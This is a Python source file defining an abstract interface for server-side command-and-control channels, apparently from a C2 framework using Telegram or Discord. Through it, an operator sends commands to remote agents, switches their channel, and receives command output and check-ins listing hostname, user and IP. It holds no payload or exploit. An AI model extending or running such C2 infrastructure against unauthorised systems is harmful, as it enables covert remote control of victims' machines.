"""
Abstract base class for C2 communication channels.
"""

from abc import ABC, abstractmethod
from typing import Callable, Optional


# Callback signatures
ResultCallback   = Callable[[str, str, str, str], None]   # (agent_id, instr_id, output, channel_name)
CheckinCallback  = Callable[[str, str, str, str, str, str], None]  # (agent_id, hostname, os, user, ip, channel_name)
SwitchAckCallback = Callable[[str, str], None]             # (agent_id, channel_name)


class C2Channel(ABC):
    """
    Contract for all server-side C2 channels.
    Each channel runs in its own thread and communicates events via callbacks.
    """

    @property
    @abstractmethod
    def name(self) -> str:
        """Human-readable channel identifier (e.g. 'telegram', 'discord')."""
        ...

    @abstractmethod
    def connect(self):
        """Establish connection to the channel. Raises on failure."""
        ...

    @abstractmethod
    def send_instruction(self, agent_id: str, instruction_id: str, command: str):
        """Send INSTRUCTION|agent_id|instr_id|command through this channel."""
        ...

    @abstractmethod
    def send_switch(self, agent_id: str, target_channel: str):
        """Send SWITCH|agent_id|target_channel through this channel."""
        ...

    @abstractmethod
    def disconnect(self):
        """Gracefully tear down the connection."""
        ...

    # ─── Callback registration ──────────────────────

    def set_result_callback(self, callback: ResultCallback):
        self._result_callback = callback

    def set_checkin_callback(self, callback: CheckinCallback):
        self._checkin_callback = callback

    def set_switchack_callback(self, callback: SwitchAckCallback):
        self._switchack_callback = callback

    # ─── Callback invocation ──────────────────────

    def _on_result(self, agent_id: str, instruction_id: str, output: str):
        cb = getattr(self, "_result_callback", None)
        if cb:
            cb(agent_id, instruction_id, output, self.name)

    def _on_checkin(self, agent_id: str, hostname: str, os_name: str, user: str, ip: str):
        cb = getattr(self, "_checkin_callback", None)
        if cb:
            cb(agent_id, hostname, os_name, user, ip, self.name)

    def _on_switchack(self, agent_id: str, channel_name: str):
        cb = getattr(self, "_switchack_callback", None)
        if cb:
            cb(agent_id, channel_name)
